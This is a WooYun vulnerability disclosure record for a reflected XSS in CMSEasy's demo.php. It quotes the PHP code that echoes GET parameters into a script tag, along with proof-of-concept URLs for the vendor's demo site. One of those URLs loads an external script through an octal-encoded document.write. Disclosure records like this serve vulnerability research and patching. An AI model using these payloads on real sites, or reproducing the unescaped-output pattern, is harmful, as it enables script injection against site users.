{"id": 52983, "wybug_id": "wooyun-2014-069363", "wybug_title": "cmseasy反射型XSS无视360webscan&amp;浏览器filter", "wybug_corp": "cmseasy", "wybug_author": "phith0n", "wybug_date": "2014-07-23 12:01", "wybug_open_date": "2014-10-21 12:02", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-21：\t细节向公众公开  简要描述： 无视浏览器filter，360webscan~你们俩哪凉快呆哪去~另外，一直以来读代码的过程中学到了很多，真心希望cmseasy越做越好！ 详细说明：  cmseasy默认安装完成以后首页有个demo.php，不知道是干嘛的，里面某处未做过滤，可以xss：demo.php 91行：\n<script type=\"text/javascript\">var mf=myFocus;//简称var html=mf.$('myFocus-wrap').innerHTML;//保存原htmlfunction getParam(){//获取全部参数\treturn {\t\tid:'myFocus',\t\tpattern:'<?php echo $_GET['pattern']; ?>',\t\ttime:<?php echo $_GET['time']; ?>,\t\twidth:<?php echo $_GET['width']; ?>,\t\theight:<?php echo $_GET['height']; ?>\t};}\n直接将$_GET到的变量输出在<script>标签内，造成了XSS。因为在script标签内（而且$_GET[time]甚至不用引入单引号），所以绕过各种浏览器filter，而且此demo.php并没有包含360webscan，所以无视之。详见漏洞证明。   漏洞证明：  官网demo测试：\nhttp://demo.cmseasy.cn/demo.php?time=alert(1)\n\n\n加载外部js:\nhttp://demo.cmseasy.cn/demo.php?time=document.write(\"\\74\\163\\143\\162\\151\\160\\164\\40\\163\\162\\143\\75\\150\\164\\164\\160\\72\\57\\57\\170\\163\\163\\56\\143\\157\\155\\57\\170\\56\\152\\163\\76\\74\\57\\163\\143\\162\\151\\160\\164\\76\")\n   修复方案：  过滤。   版权声明：转载请注明来源 phith0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-07-24 08:25 厂商回复： 立即修正 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}